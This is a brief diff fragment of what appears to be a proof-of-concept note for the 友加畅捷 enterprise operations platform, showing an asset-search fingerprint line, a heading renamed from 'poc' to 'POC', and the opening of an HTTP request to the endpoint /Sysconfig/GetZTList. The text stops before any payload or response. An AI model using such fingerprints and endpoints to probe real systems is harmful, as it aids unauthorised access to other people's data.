@@ -8,7 +8,7 @@
 product="友加畅捷-企业实时运营管理平台"
 ```
 
-## poc
+## POC
 ```
 GET /Sysconfig/GetZTList HTTP/1.1
 Host: 
